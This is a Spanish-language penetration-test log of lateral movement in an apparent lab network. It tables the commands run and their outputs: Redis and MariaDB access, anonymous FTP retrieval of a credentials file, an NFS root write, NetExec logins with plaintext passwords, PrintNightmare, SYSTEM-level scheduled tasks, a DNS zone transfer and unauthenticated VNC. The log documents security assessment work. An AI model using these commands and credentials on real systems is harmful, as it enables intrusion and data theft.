# Bitácora · Fase 4 · Movimiento lateral

Fecha UTC: 2026-10-24 · Ejecuta: M6 → M2/M3 (M4/M5 pendientes)

## M2 · Base de datos y Redis

| ID | Comando | Explicación | Salida real (resumen) | Evidencia | Lectura |
|---|---|---|---|---|---|
| CMD-F04-001 | `redis-cli -h 10.10.10.12 PING` | Comprueba auth de Redis | `PONG` | `F04-001` | Redis sin contraseña |
| CMD-F04-002 | `redis-cli -h 10.10.10.12 INFO server \| grep redis_version` | Versión | `redis_version:6.2.6` | `F04-001` | Versión del CVE-2022-0543 |
| CMD-F04-003 | `redis-cli -h 10.10.10.12 CONFIG GET requirepass` | ¿Hay contraseña? | `requirepass` (vacío) | `F04-001` | Acceso sin auth confirmado |
| CMD-F04-004 | `redis-cli -h 10.10.10.12 EVAL 'local l=package.loadlib(...)' 0` | Intento CVE-2022-0543 | `ERR ... nonexistent global variable 'package'` | `F04-001b` | No explotable en este build |
| CMD-F04-005 | `ssh -L 13306:10.10.10.12:3306 ubuntu@10.10.10.11 -N` + `mysql --skip-ssl ...` | Túnel y login MariaDB | `wordpress`; 12 tablas | `F04-003` | D2 validado con `wp_user`/`wp_pass123` |
| CMD-F04-006 | `mysql ... -u moodle_user -p'wp_pass123'` | Moodle DB | `moodle_db`; 487 tablas | `F04-004b` | Mismas credenciales |
| CMD-F04-023 | `redis-cli` + `INFO` + `CONFIG GET requirepass` + `nmap -p 3306,6379,161` | Revalidación M2 arriba | `PONG`; 6.2.6; vacío; `6379 open` | `F04-018` | D1/D2/D3 |
| CMD-F04-024 | `sudo grep ^rocommunity/^rwcommunity` + `ss -uln` en M2 | Config SNMP | `public`/`private`; `:161` en `.12` | `F04-019` | D4 |

## M3 · Respaldos

| ID | Comando | Explicación | Salida real (resumen) | Evidencia | Lectura |
|---|---|---|---|---|---|
| CMD-F04-007 | `curl -s ftp://anonymous:anonymous@10.10.10.13/backups/` | FTP anónimo | `credenciales.txt`, dumps de `wordpress`, `moodle_db`, `redis` | `F04-002` | B3 validado |
| CMD-F04-008 | `curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt` | Descarga secreto | `admin M4/M5: Admin13.-` | `F04-002` | Clave para M4/M5 |
| CMD-F04-009 | `smbclient -L //10.10.10.13 -N` | Enumera SMB | `backups`, `IPC$`; workgroup `USCLAB` | `F04-005` | Recurso escribible; Samba 4.5.10 |
| CMD-F04-010 | `showmount -e 10.10.10.13` (M1) | Exportaciones NFS | sin salida útil / timeout desde M1 | `F04-005` | NFS responde en 2049 desde M1 |
| CMD-F04-011 | `mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/backups-test` + `touch` | Prueba `no_root_squash` | `-rw-r--r-- 1 root root ... ROOT_FUE_AQUI.txt` | `F04-006` | B4 validado |
| CMD-F04-012 | `printf 'USER x:)\r\nPASS x\r\n' \| nc 10.10.10.13 21` + `nc -zv 10.10.10.13 6200` | Backdoor vsftpd | `530 This FTP server is anonymous only`; `:6200` sin conexión | evidencia manual | B2 no presente |

## M4 · Windows Server

| ID | Comando | Salida real (resumen) | Evidencia | Estado |
|---|---|---|---|---|
| CMD-F04-013 | `nxc smb 10.10.10.14 -u 'Administrador' -p 'password_2026' --local-auth --shares` | `[+] ... (Pwn3d!)`; `ADMIN$`, `C$`, `legacy` READ,WRITE | `F04-015` | ✅ S3 |
| CMD-F04-014 | `nxc smb ... -x 'whoami'` | `srvold\administrador` | `F04-015` | ✅ admin |
| CMD-F04-018 | `msfconsole` PrintNightmare `check` | `The target is vulnerable` | `F04-016` | ✅ S2 check |
| CMD-F04-019 | PrintNightmare `run` | `Exploit completed, but no session was created` | `F04-016` | ⚠️ sin sesión |
| CMD-F04-020 | `nxc winrm ... -x 'schtasks /create ... /ru SYSTEM'` + `run` + `type` | `nt authority\system` | `F04-017` | ✅ nivel SYSTEM (no S2) |
| CMD-F04-021 | `smbclient //.../legacy -c 'ls'` + `get PWNED-M4.txt` | `PWNED-M4 sáb. 24/10/2026 13:02:13.20` | `F05-003b` | ✅ impacto M4 |
| CMD-F04-015 | `dig axfr uni.lab @10.10.10.14 +time=5 +tries=1` | Zona completa: `app`, `bkp`, `db`, `moodle`, `pc-est01`, `srvold`, `wp` | `F04-012` | ✅ S4 |
| CMD-F04-016 | `nmap -Pn -sT -p 445 --script smb-vuln-ms17-010 10.10.10.14` | sin salida; MSF `SMB Login Error ... IPC$`; `enum4linux`: `SMB1 only: false` | `F04-014` | 🔴 S1 no explotable |
| CMD-F04-017 | `nmap -Pn -sT -p 445 --script smb-security-mode 10.10.10.14` | `message_signing: disabled` | `F04-013` | ✅ S5 |

## M5 · Cliente

| ID | Comando | Salida real (resumen) | Evidencia | Estado |
|---|---|---|---|---|
| CMD-F04-018 | `ssh -L 1445:10.10.10.15:445 ubuntu@10.10.10.11 -N` + `nxc smb 127.0.0.1 --port 1445 -u cliente -p 'Admin13.-' --shares` | `[+] DESKTOP-DT5F05N\cliente:Admin13.-`; shares `ADMIN$`, `C$`, `IPC$` | salida 13:08 UTC | ✅ |
| CMD-F04-019 | `nxc smb ... -x whoami` | autentica, pero no devuelve salida (UAC/exec) | — | 🟡 |
| CMD-F04-020 | `nmap -Pn -p 5900 --script vnc-info 10.10.10.15` | `Security types: None (1)`; `WARNING: Server does not require authentication` | `F04-008` | ✅ |
| CMD-F04-021 | `vncviewer 10.10.10.15` | escritorio de `desktop-dt5f05n` sin clave | `F04-009` | ✅ |
| CMD-F04-022 | `whoami` en consola VNC | `desktop-dt5f05n\cliente` | `F04-011` | ✅ |
| CMD-F04-023 | `echo PWNED-M5 ... > Desktop\PWNED-M5.txt` | `PWNED-M5 24/10/2026 12:11:09,24` | `F05-001` | ✅ |
| CMD-F04-024 | `xfreerdp /v:10.10.10.15 /u:cliente` | no ejecutado; puerto 3389 open | `F02-001` | ⬜ opcional |
